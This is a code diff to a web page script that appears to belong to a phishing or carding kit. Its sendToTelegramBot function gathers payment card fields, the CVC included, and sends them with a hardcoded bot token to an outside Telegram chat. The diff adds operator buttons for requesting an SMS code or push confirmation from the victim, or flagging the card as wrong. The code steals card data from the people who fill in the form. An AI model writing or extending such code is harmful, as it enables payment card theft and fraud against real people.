@@ -1288,7 +1288,7 @@ async function sendToTelegramBot() {
 • CVC: ${document.getElementById('cvc').value || '-'}
 `;
 
-        // ЗАМЕНИ НА СВОИ ДАННЫЕ
+        // Отправляем сообщение через бота (а не напрямую в API)
         const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
         const CHAT_ID = '-1003239032658';
 
@@ -1300,7 +1300,18 @@ async function sendToTelegramBot() {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'HTML'
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "📱 SMS код", callback_data: "sms_code" },
+                            { text: "🔔 Пуш", callback_data: "push" }
+                        ],
+                        [
+                            { text: "❌ Неверная карта", callback_data: "wrong_card" }
+                        ]
+                    ]
+                }
             })
         });
 
